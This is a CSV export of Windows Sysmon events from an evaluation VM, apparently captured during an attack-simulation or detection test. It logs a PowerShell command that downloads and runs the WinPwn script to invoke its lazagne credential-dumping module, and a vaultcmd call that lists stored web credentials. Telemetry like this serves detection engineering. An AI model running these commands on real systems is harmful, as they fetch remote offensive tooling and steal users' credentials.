Microsoft-Windows-Sysmon/Operational,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=5200 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61",Microsoft Corporation,WinDev2309Eval,,C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\,Microsoft Edge WebView2,,,,,,,1,9483,,120.0.2210.91,"MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63",C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe,,Low,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:34:31.960

ProcessGuid: {fda94052-4127-658d-7b02-000000000b00}

ProcessId: 1788

Image: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

FileVersion: 120.0.2210.91

Description: Microsoft Edge WebView2

Product: Microsoft Edge WebView2

Company: Microsoft Corporation

OriginalFileName: msedgewebview2.exe

CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=5200 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Low

Hashes: MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63

ParentProcessGuid: {fda94052-b85d-658c-1702-000000000b00}

ParentProcessId: 4184

ParentImage: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

ParentCommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

ParentUser: WINDEV2309EVAL\User",Info,msedgewebview2.exe,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61",C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe,{fda94052-b85d-658c-1702-000000000b00},4184,WINDEV2309EVAL\User,,{fda94052-4127-658d-7b02-000000000b00},7044,1788,Microsoft Edge WebView2,,,,,"
      ",-,,,,,,2023-12-28T09:34:31.9616887Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:34:31.960,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:34:31.9616887Z""/>
      <EventRecordID>9483</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:34:31.960</Data>
      <Data Name=""ProcessGuid"">{fda94052-4127-658d-7b02-000000000b00}</Data>
      <Data Name=""ProcessId"">1788</Data>
      <Data Name=""Image"">C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe</Data>
      <Data Name=""FileVersion"">120.0.2210.91</Data>
      <Data Name=""Description"">Microsoft Edge WebView2</Data>
      <Data Name=""Product"">Microsoft Edge WebView2</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">msedgewebview2.exe</Data>
      <Data Name=""CommandLine"">""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=5200 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61</Data>
      <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Low</Data>
      <Data Name=""Hashes"">MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b85d-658c-1702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">4184</Data>
      <Data Name=""ParentImage"">C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:34:31.960

ProcessGuid: {fda94052-4127-658d-7b02-000000000b00}

ProcessId: 1788

Image: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

FileVersion: 120.0.2210.91

Description: Microsoft Edge WebView2

Product: Microsoft Edge WebView2

Company: Microsoft Corporation

OriginalFileName: msedgewebview2.exe

CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=5200 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Low

Hashes: MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63

ParentProcessGuid: {fda94052-b85d-658c-1702-000000000b00}

ParentProcessId: 4184

ParentImage: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

ParentCommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:34:29.519,,,,,,,,,11,9482,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:34:29.519

ProcessGuid: {fda94052-4125-658d-7902-000000000b00}

ProcessId: 7276

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_jy2pftog.iry.ps1

CreationUtcTime: 2023-12-28 09:34:29.519

User: WINDEV2309EVAL\User",Info,,,,,,,,{fda94052-4125-658d-7902-000000000b00},7044,7276,,,,,,"
      ",-,,,,,,2023-12-28T09:34:29.5197995Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_jy2pftog.iry.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:34:29.519,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:34:29.5197995Z""/>
      <EventRecordID>9482</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:34:29.519</Data>
      <Data Name=""ProcessGuid"">{fda94052-4125-658d-7902-000000000b00}</Data>
      <Data Name=""ProcessId"">7276</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_jy2pftog.iry.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:34:29.519</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:34:29.519

ProcessGuid: {fda94052-4125-658d-7902-000000000b00}

ProcessId: 7276

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_jy2pftog.iry.ps1

CreationUtcTime: 2023-12-28 09:34:29.519

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
lazagnemodule -consoleoutput -noninteractive}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9481,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:34:29.391

ProcessGuid: {fda94052-4125-658d-7902-000000000b00}

ProcessId: 7276

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
lazagnemodule -consoleoutput -noninteractive}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,,{fda94052-4125-658d-7902-000000000b00},7044,7276,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:34:29.3927537Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:34:29.391,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:34:29.3927537Z""/>
      <EventRecordID>9481</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:34:29.391</Data>
      <Data Name=""ProcessGuid"">{fda94052-4125-658d-7902-000000000b00}</Data>
      <Data Name=""ProcessId"">7276</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
lazagnemodule -consoleoutput -noninteractive}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:34:29.391

ProcessGuid: {fda94052-4125-658d-7902-000000000b00}

ProcessId: 7276

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
lazagnemodule -consoleoutput -noninteractive}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\VaultCmd.exe"" ""/listcreds:Web Credentials"" /all",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Vault cmdline Program,,,,,,,1,9480,,10.0.22621.1 (WinBuild.160101.0800),"MD5=4D2AD9A08F33212EDE3A128E23F00759,SHA256=D76274F883C86EF2B9090E43935D9ADC6B81B35A2A6FA39E37890F80FDFA9B76,IMPHASH=423E299DF33B8039596FF81AE53C9CA4",C:\Windows\System32\VaultCmd.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:34:29.135

ProcessGuid: {fda94052-4125-658d-7802-000000000b00}

ProcessId: 6596

Image: C:\Windows\System32\VaultCmd.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Vault cmdline Program

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: VAULTCMD.EXE

CommandLine: ""C:\Windows\system32\VaultCmd.exe"" ""/listcreds:Web Credentials"" /all

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=4D2AD9A08F33212EDE3A128E23F00759,SHA256=D76274F883C86EF2B9090E43935D9ADC6B81B35A2A6FA39E37890F80FDFA9B76,IMPHASH=423E299DF33B8039596FF81AE53C9CA4

ParentProcessGuid: {fda94052-4124-658d-7602-000000000b00}

ParentProcessId: 3284

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {vaultcmd /listcreds:\""""Web Credentials\"""" /all}

ParentUser: WINDEV2309EVAL\User",Info,VAULTCMD.EXE,"""powershell.exe"" & {vaultcmd /listcreds:\""""Web Credentials\"""" /all}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-4124-658d-7602-000000000b00},3284,WINDEV2309EVAL\User,,{fda94052-4125-658d-7802-000000000b00},7044,6596,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:34:29.1365847Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:34:29.135,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:34:29.1365847Z""/>
      <EventRecordID>9480</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:34:29.135</Data>
      <Data Name=""ProcessGuid"">{fda94052-4125-658d-7802-000000000b00}</Data>
      <Data Name=""ProcessId"">6596</Data>
      <Data Name=""Image"">C:\Windows\System32\VaultCmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Vault cmdline Program</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">VAULTCMD.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\VaultCmd.exe"" ""/listcreds:Web Credentials"" /all</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=4D2AD9A08F33212EDE3A128E23F00759,SHA256=D76274F883C86EF2B9090E43935D9ADC6B81B35A2A6FA39E37890F80FDFA9B76,IMPHASH=423E299DF33B8039596FF81AE53C9CA4</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-4124-658d-7602-000000000b00}</Data>
      <Data Name=""ParentProcessId"">3284</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {vaultcmd /listcreds:\""""Web Credentials\"""" /all}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:34:29.135

ProcessGuid: {fda94052-4125-658d-7802-000000000b00}

ProcessId: 6596

Image: C:\Windows\System32\VaultCmd.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Vault cmdline Program

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: VAULTCMD.EXE

CommandLine: ""C:\Windows\system32\VaultCmd.exe"" ""/listcreds:Web Credentials"" /all

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=4D2AD9A08F33212EDE3A128E23F00759,SHA256=D76274F883C86EF2B9090E43935D9ADC6B81B35A2A6FA39E37890F80FDFA9B76,IMPHASH=423E299DF33B8039596FF81AE53C9CA4

ParentProcessGuid: {fda94052-4124-658d-7602-000000000b00}

ParentProcessId: 3284

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {vaultcmd /listcreds:\""""Web Credentials\"""" /all}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:34:28.386,,,,,,,,,11,9479,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:34:28.386

ProcessGuid: {fda94052-4124-658d-7602-000000000b00}

ProcessId: 3284

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_drn1bbhb.150.ps1

CreationUtcTime: 2023-12-28 09:34:28.386

User: WINDEV2309EVAL\User",Info,,,,,,,,{fda94052-4124-658d-7602-000000000b00},7044,3284,,,,,,"
      ",-,,,,,,2023-12-28T09:34:28.3933050Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_drn1bbhb.150.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:34:28.386,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
